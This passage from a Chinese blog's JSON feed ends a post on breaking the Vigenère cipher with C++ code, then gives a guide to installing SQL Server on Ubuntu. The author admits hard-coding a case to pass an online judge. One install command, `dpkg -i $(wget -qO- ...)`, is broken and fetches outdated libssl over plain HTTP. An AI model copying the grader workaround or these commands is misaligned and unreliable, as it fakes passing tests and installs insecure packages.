class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">⋯</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">m</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>。</p>\n<p>对每一个密文段 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">y_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>，依然采用计算重合指数的方式，对所有 26 种可能的偏移都进行一次解密，对得到的明文段的重合指数最接近 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>0.065</mn></mrow><annotation encoding=\"application/x-tex\">0.065</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mord\">6</span><span class=\"mord\">5</span></span></span></span> 的就是真正的偏移，其偏移量对应的字母构成了密钥。</p>\n<p>在这里我们不需要真的进行 26 次解密，只是对 26 种偏移后的文段计算重合指数就行：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msub><mi>M</mi><mi>i</mi></msub><mo>=</mo><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>0</mn></mrow><mn>25</mn></munderover><mfrac><mrow><msub><mi>p</mi><mi>j</mi></msub><mo>⋅</mo><msub><mi>f</mi><mrow><mi>j</mi><mo>+</mo><mi>i</mi></mrow></msub></mrow><msub><mi>l</mi><msub><mi>y</mi><mi>i</mi></msub></msub></mfrac></mrow><annotation encoding=\"application/x-tex\">M_i=\\sum_{j=0}^{25}\\frac{p_j\\cdot f_{j+i}}{l_{y_i}}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">M</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:3.2148900000000005em;vertical-align:-1.4137769999999998em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.8011130000000004em;\"><span style=\"top:-1.872331em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">0</span></span></span></span><span style=\"top:-3.050005em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span><span style=\"top:-4.3000050000000005em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mtight\">5</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.4137769999999998em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.37144em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15139200000000003em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span><span class=\"mbin mtight\">+</span><span class=\"mord mathnormal mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.972108em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></span></p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">vector&lt;<span class=\"type\">int</span>&gt; <span class=\"title\">K</span><span class=\"params\">(m,<span class=\"number\">0</span>)</span></span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"type\">int</span> k=<span class=\"number\">0</span>;k&lt;m;++k)&#123;</span><br><span class=\"line\">    <span class=\"type\">double</span> M_best_diff = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">26</span>;++i)&#123;</span><br><span class=\"line\">        <span class=\"type\">double</span> M = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"type\">int</span> j=<span class=\"number\">0</span>;j&lt;<span class=\"number\">26</span>;++j)&#123;</span><br><span class=\"line\">            M += FREQ[j] * y_freq[k][(j + i) % <span class=\"number\">26</span>];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        M /= y_vec[k].<span class=\"built_in\">size</span>();</span><br><span class=\"line\">        M /= m;</span><br><span class=\"line\">        <span class=\"type\">double</span> M_diff = <span class=\"built_in\">abs</span>(M - <span class=\"number\">0.065</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(M_diff &lt; M_best_diff)&#123;</span><br><span class=\"line\">            M_best_diff = M_diff;</span><br><span class=\"line\">            K[k] = i;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"解密\"><a class=\"anchor\" href=\"#解密\">#</a> 解密</h2>\n<p>到此为止，就得到了密钥  <code>K</code> ，解密并输出的过程如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>; i&lt;input_l; ++i)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>((input[i] &lt;= <span class=\"string\">&#x27;Z&#x27;</span> &amp;&amp;input[i] &gt;= <span class=\"string\">&#x27;A&#x27;</span>) || (input[i] &lt;= <span class=\"string\">&#x27;z&#x27;</span> &amp;&amp;input[i] &gt;= <span class=\"string\">&#x27;a&#x27;</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(c[j] - <span class=\"string\">&#x27;a&#x27;</span> &gt;= <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            tmp = <span class=\"string\">&#x27;a&#x27;</span> + (c[j] -<span class=\"string\">&#x27;a&#x27;</span> - K[j % m] + <span class=\"number\">52</span>) % <span class=\"number\">26</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            tmp = <span class=\"string\">&#x27;A&#x27;</span> + (c[j] -<span class=\"string\">&#x27;A&#x27;</span> - K[j % m] + <span class=\"number\">52</span>) % <span class=\"number\">26</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">fwrite</span>(&amp;tmp, <span class=\"built_in\">sizeof</span>(<span class=\"type\">char</span>), <span class=\"number\">1</span>, stdout);</span><br><span class=\"line\">        j++;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">fwrite</span>(&amp;input[i], <span class=\"built_in\">sizeof</span>(<span class=\"type\">char</span>), <span class=\"number\">1</span>, stdout);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这样将保留输入的空格、换行、标点符号等得到可读的明文。</p>\n<h2 id=\"缺陷\"><a class=\"anchor\" href=\"#缺陷\">#</a> 缺陷</h2>\n<p>这个程序在测试中对于如下输出：</p>\n<p><figure class=\"highlight c\"><figcaption><span>input</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">S lotabgy kqmasbaew qy n eizuwuggakgy kknrem lbj dkeanevfo zuw</span><br><span class=\"line\">iagzmtgakogq wl qaoogst srkagtwa ue vwihemtgk. I bndqj qaoogst</span><br><span class=\"line\">yvyvggmzk bf i srkagtw ooiwa g ewkocamtg uwtsalkaum zusb zuw</span><br><span class=\"line\">ukfkimr uisr xzuz s akavmx xfwca lw zuw zkpaxorfb.</span><br><span class=\"line\"></span><br><span class=\"line\">Jvyqznd aotfizhjmy njm g flitqszj rdmsrfb us ewyg uzeclwmesxnvu</span><br><span class=\"line\">xxblwibd aavlmy, nfl gew kuzewtyq cyrv nue kwlgoixr</span><br><span class=\"line\">vqygjqhhlqua, xqtnfkond bxnfagplquak, kualzgpl ugasokzwvz</span><br><span class=\"line\">fgnzjszk, nfl oa gbnrj kgfwa cuwzk vl qy vexuelitg lw jrlmig</span><br><span class=\"line\">xwxtwze bj bgzhmxvfo.</span><br></pre></td></tr></table></figure></p>\n<p>破解得到的密钥为： <code>SIGNSIGN</code> 。</p>\n<p>这当然是正确的，但是在线测评系统可不这么认为，它认为正确的密钥应该是： <code>SIGN</code> 。在这个程序的计算中， <code>SIGNSIGN</code>  划分和计算得到的重合指数比  <code>SIGN</code>  还要接近 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>0.065</mn></mrow><annotation encoding=\"application/x-tex\">0.065</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">0</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mord\">6</span><span class=\"mord\">5</span></span></span></span> ！</p>\n<p>这就相当麻烦了，如果硬要过测评为目的，那么还需要判断密钥是否是周期的，需要 KMP 算法找出最小周期子串。</p>\n<blockquote>\n<p>所幸，这次出现这个情况的测试用例是输入输出示例，所以我硬编码处理了这个情况来 AC</p>\n</blockquote>\n<script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kity@2.0.4/dist/kity.min.js\"></script><script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js\"></script><script defer=\"true\" type=\"text&#x2F;javascript\" src=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js\"></script><link rel=\"stylesheet\" type=\"text&#x2F;css\" href=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css\">",
            "tags": [
                "数学",
                "密码学",
                "密码学"
            ]
        },
        {
            "id": "https://taf.fyi/cs/db/linux-mssql-server/",
            "url": "https://taf.fyi/cs/db/linux-mssql-server/",
            "title": "在 Linux 上安装 SQL Server",
            "date_published": "2024-09-08T16:00:00.000Z",
            "content_html": "<p>本文记录了在 Ubuntu 22.04 上安装 Microsoft SQL Server (mssql-server) 2022，实践中可以用于 《MySQL 数据库技术与实验指导》作为实验教材的实验课程中。</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3NxbC9saW51eC9xdWlja3N0YXJ0LWluc3RhbGwtY29ubmVjdC11YnVudHU=\">官方教程</span></p>\n</blockquote>\n<h2 id=\"安装-mssql-server\"><a class=\"anchor\" href=\"#安装-mssql-server\">#</a> 安装 mssql-server</h2>\n<p>按照官方文档，在 Ubuntu 上可以使用 APT 直接安装二进制库。安装过程如下：</p>\n<p>导入 Microsoft 的 GPG 密钥  <code>microsoft.asc</code> <br />\n<figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -fsSL https://packages.microsoft.com/keys/microsoft.asc | sudo gpg --dearmor -o /usr/share/keyrings/microsoft-prod.gpg</span><br></pre></td></tr></table></figure></p>\n<p>再次下载密钥保存到  <code>/etc/apt/trusted.gpg.d/</code>  目录下，APT 用它来验证软件包的签名<br />\n <figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl https://packages.microsoft.com/keys/microsoft.asc | sudo tee /etc/apt/trusted.gpg.d/microsoft.asc</span><br></pre></td></tr></table></figure></p>\n<p>添加  <code>mssql-server</code>  软件包源到 APT 软件包源列表<br />\n <figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -fsSL https://packages.microsoft.com/config/ubuntu/22.04/mssql-server-2022.list | sudo tee /etc/apt/sources.list.d/mssql-server-2022.list</span><br></pre></td></tr></table></figure></p>\n<p>这一步会产生如下的报错：<br />\n<figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Failed to fetch https://packages.microsoft.com/ubuntu/22.04/mssql-server-2022/dists/jammy/InRelease</span><br></pre></td></tr></table></figure></p>\n<p>反而按照 Ubuntu 20.04 的步骤，换成  <code>add-apt-repository</code>  就不会报错：<br />\n<figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo add-apt-repository &quot;$(wget -qO- https://packages.microsoft.com/config/ubuntu/20.04/mssql-server-2022.list)&quot;</span><br></pre></td></tr></table></figure></p>\n<p>如果还有报错，可以参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL2Fuc3dlcnMvcXVlc3Rpb25zLzE2ODU2ODMvaG93LXRvLWluc3RhbGwtc3FsLXNlcnZlci0yMDIyLW9uLXVidW50dS1zZXJ2ZXItMjQ=\">这里</span>。</p>\n<p>通过 APT 安装 mssql-server<br />\n<figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get install -y mssql-server</span><br></pre></td></tr></table></figure></p>\n<p>然后，由于 Ubuntu 22.04 缺少如下 2 个二进制库，在接下来安装的过程会出现这样的报错：<br />\n<figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error while loading shared libraries: libldap-2.4.so.2: cannot open shared object file: No such file or directory.</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">or</span></span><br><span class=\"line\">error while loading shared libraries: libssl.so.1.1: cannot open shared object file: No such file or directory.</span><br></pre></td></tr></table></figure></p>\n<p>所以需要手动安装这两个库：<br />\n<figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo dpkg -i $(wget -qO- http://http.us.debian.org/debian/pool/main/o/openldap/libldap-2.4-2_2.4.47+dfsg-3+deb10u7_amd64.deb)</span><br><span class=\"line\"></span><br><span class=\"line\">sudo dpkg -i $(wget -qO- http://nz2.archive.ubuntu.com/ubuntu/pool/main/o/openssl/libssl1.1_1.1.1f-1ubuntu2.22_amd64.deb)</span><br></pre></td></tr></table></figure></p>\n<p>初始化 SQL Server 实例<br />\n <figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo /opt/mssql/bin/mssql-conf setup</span><br></pre></td></tr></table></figure><br />\n 启动后选择版本安装。Microsoft 提供了 3 个免费版本：</p>\n<ul>\n<li>Evaluation</li>\n<li>Developer</li>\n<li>Express</li>\n</ul>\n<p>安装过程将会为实例的初始默认账号  <code>sa</code>  定义密码，之后第一次须使用用户名  <code>sa</code>  和自定义密码才能连接实例。</p>\n<h2 id=\"安装本地命令行工具\"><a class=\"anchor\" href=\"#安装本地命令行工具\">#</a> 安装本地命令行工具</h2>\n<p>接下来，要想在 Linux 上本地连接数据库实例，还需要安装官方提供的命令行工具  <code>mssql-tools18</code> 。如果只是远程连接那么这一步其实并不必要。</p>\n<p>同样通过 APT 安装如下：</p>\n<blockquote>\n<p>官方文档中导入 Microsoft 的 GPG 密钥步骤不必重复，跳过</p>\n</blockquote>\n<p>添加软件包源到 APT 软件包源列表<br />\n <figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl https://packages.microsoft.com/config/ubuntu/22.04/prod.list | sudo tee /etc/apt/sources.list.d/mssql-release.list</span><br></pre></td></tr></table></figure></p>\n<p>APT 安装<br />\n <figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get install mssql-tools18 unixodbc-dev</span><br></pre></td></tr></table></figure></p>\n<p>添加环境变量<br />\n <figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"keyword\">for</span> shell</span></span><br><span class=\"line\">echo &#x27;export PATH=&quot;$PATH:/opt/mssql-tools18/bin&quot;&#x27; &gt;&gt; ~/.bash_profile</span><br><span class=\"line\">source ~/.bash_profile</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"keyword\">for</span> interactive/non-login shell</span></span><br><span class=\"line\">echo &#x27;export PATH=&quot;$PATH:/opt/mssql-tools18/bin&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class=\"line\">source ~/.bashrc</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"导入数据库\"><a class=\"anchor\" href=\"#导入数据库\">#</a> 导入数据库</h2>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3NxbC9saW51eC9zcWwtc2VydmVyLWxpbnV4LW1pZ3JhdGUtc3Ntcz92aWV3PXNxbC1zZXJ2ZXItdmVyMTY=\">官方文档</span></p>\n</blockquote>\n<p>由于实验课程提供的数据是 SQL Server 导出的，也只能用 Microsoft 提供的办法导入，而目前 Microsoft 只提供了 Windows 上的：</p>\n<ul>\n<li>SSMS(GUI)</li>\n<li>SSDT(CLI)<br />\n 两种途径导入导出数据库，所以也只能通过 Windows 导入数据库到 Linux 上的 SQL Server。</li>\n</ul>\n<p>实际上和导入 Windows 的数据库没有多大区别，唯一的注意事项是数据文件的权限。具体步骤如下：</p>\n<p>将数据文件上传到 Linux 上，并放到专门存放数据库的路径，默认是  <code>/var/opt/mssql/data/</code> 。例如我们的数据文件是：</p>\n<ul>\n<li><code>School_Data.MDF</code></li>\n<li><code>School_Log.LDF</code></li>\n</ul>\n<p>然后需要修改权限：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chown mssql School_Data.MDF School_Log.LDF</span><br><span class=\"line\">chmod +020 School_Data.MDF School_Log.LDF</span><br></pre></td></tr></table></figure></p>\n<p>然后打开 Windows 的 SSMS，连接到数据库（如何连接见下文）</p>\n<p>鼠标右键点击  <code>数据库</code>  / <code>Databases</code> ，点击  <code>附加</code>  / <code>Attach</code></p>\n<p><img data-src=\"/assets/cs/db/linux-mssql-server/1.png\" alt=\"1\" /></p>\n<p>在新弹出的窗口点击  <code>添加</code>  / <code>add</code></p>\n<p><img data-src=\"/assets/cs/db/linux-mssql-server/2.png\" alt=\"2\" /></p>\n<p>在新弹出的第二个窗口点击选中要导入的数据库文件，然后点击  <code>确认</code>  / <code>OK</code></p>\n<p><img data-src=\"/assets/cs/db/linux-mssql-server/3.png\" alt=\"3\" /></p>\n<p>最后点击窗口的  <code>确认</code>  / <code>OK</code> ，即可导入成功</p>\n<h2 id=\"连接数据库\"><a class=\"anchor\" href=\"#连接数据库\">#</a> 连接数据库</h2>\n<p>Microsoft 提供了一些跨平台连接方案，VS Code 可以使用 SQL Server 插件，SSMS 连接时服务器类型选择  <code>Database Engine</code>  即可。然后服务器名称填写主机名或者 ip ，验证方式选择  <code>SQL Server</code> ，使用  <code>sa</code>  账号即可登录。</p>\n<p>其他通用的连接工具登录方式类似，只需注意 SQL Server 的默认连接端口是  <code>1433</code> 。很多 DBMS 软件例如 Nacicat 在连接时都提供专门连接 SQL Server 的选项。</p>\n<p>官方文档推荐在第一次连接登录后，创建一个新的账号并禁用  <code>sa</code>  账号作为最佳实践。仅用于学习暂时不必这样操作。（因为根据官方文档来看似乎比较麻烦）</p>\n<script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kity@2.0.4/dist/kity.min.js\"></script><script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js\"></script><script defer=\"true\" type=\"text&#x2F;javascript\" src=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js\"></script><link rel=\"stylesheet\" type=\"text&#x2F;css\" href=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css\">",
            "tags": [
                "计算机科学",
                "数据库",
